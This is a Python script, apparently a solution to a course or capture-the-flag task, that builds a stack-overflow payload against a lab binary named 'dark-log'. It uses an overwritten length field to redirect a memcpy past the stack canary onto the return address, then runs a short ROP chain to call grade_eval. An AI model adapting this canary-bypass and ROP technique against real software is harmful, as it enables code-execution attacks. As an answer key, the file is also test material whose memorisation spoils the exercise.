#!/usr/bin/env python3
"""Task 4: bypass the stack canary in dark-log.

Stack layout of input() (log_frame at rbp-0x120, canary at rbp-0x8):

    +0x000  expression[128]   <- gets() writes here
    +0x080  logMsg[128]
    +0x100  len (int)
    +0x108  pad[8]
    +0x118  canary            <- must stay untouched
    +0x120  saved rbp
    +0x128  return address    <- logMsg + 168

gets() writes exactly 260 bytes: expression, logMsg and len, stopping
before the canary.  The overwritten len becomes 168, so the memcpy in
input() copies expression (128 bytes) to logMsg+168, i.e. right onto
the return-address slot, replacing it without ever touching the
canary.

The first 32 bytes of expression form a tiny ROP chain that runs
after input() returns:

    0x4018a3  pop rdi; ret        ; rdi = 4
    0x4018a4  ret                 ; realign rsp for printf (movaps)
    0x401677  grade_eval          ; grade == 4 -> "Hope A will be your grade!"

grade_eval's own canary slot lands on expression bytes 16..23 (the
ret gadget address), so its epilogue check fails and the process dies
with __stack_chk_fail -- after printf and fflush already produced the
required output.
"""
import struct
import sys

payload = b""
payload += struct.pack("<Q", 0x4018A3)  # [0..7]   -> return slot: pop rdi; ret
payload += struct.pack("<Q", 4)         # [8..15]  -> rdi = 4
payload += struct.pack("<Q", 0x4018A4)  # [16..23] -> ret (stack alignment)
payload += struct.pack("<Q", 0x401677)  # [24..31] -> grade_eval
payload += b"A" * (128 - 32)            # [32..127] rest of expression
payload += b"B" * 128                   # [128..255] logMsg (garbage)
payload += struct.pack("<I", 168)       # [256..259] len -> memcpy dst = logMsg+168 = ret slot
payload += b"\n"

sys.stdout.buffer.write(payload)
